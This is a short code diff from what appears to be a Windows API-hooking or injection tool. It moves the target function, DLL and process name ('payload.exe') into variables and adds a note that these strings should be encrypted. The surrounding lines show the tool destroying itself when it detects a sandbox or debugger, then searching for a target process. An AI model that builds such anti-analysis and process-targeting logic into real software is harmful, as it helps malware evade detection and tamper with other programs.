@@ -11,8 +11,10 @@
 //#define TARGET_FUNC	"MessageBoxA"
 //#define TARGET_DLL	"USER32"
 
-char const*	TARGET_FUNC = "MessageBoxA";
-const char* TARGET_DLL  = "USER32";
+// These should be encrypted
+char const*	TARGET_FUNC = "MessageBoxA"; // Replace with target winapi function
+const char* TARGET_DLL  = "USER32";		 // Replace with target winapi functions corresponding DLL
+const char* TARGET_EXE  = "payload.exe"; // Replace with the binary to target
 
 
 // Get rid of weird crt call because of float
@@ -48,7 +50,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	do
 	{
 		hide.IsBeingWatched(resolver);				  // Nuke self if in sandbox or debugger
-		process = tools.GetPID("payload.exe");	  // Check if target process is running
+		process = tools.GetPID(TARGET_EXE);		  // Check if target process is running
 
 		if (process != 0)
 		{
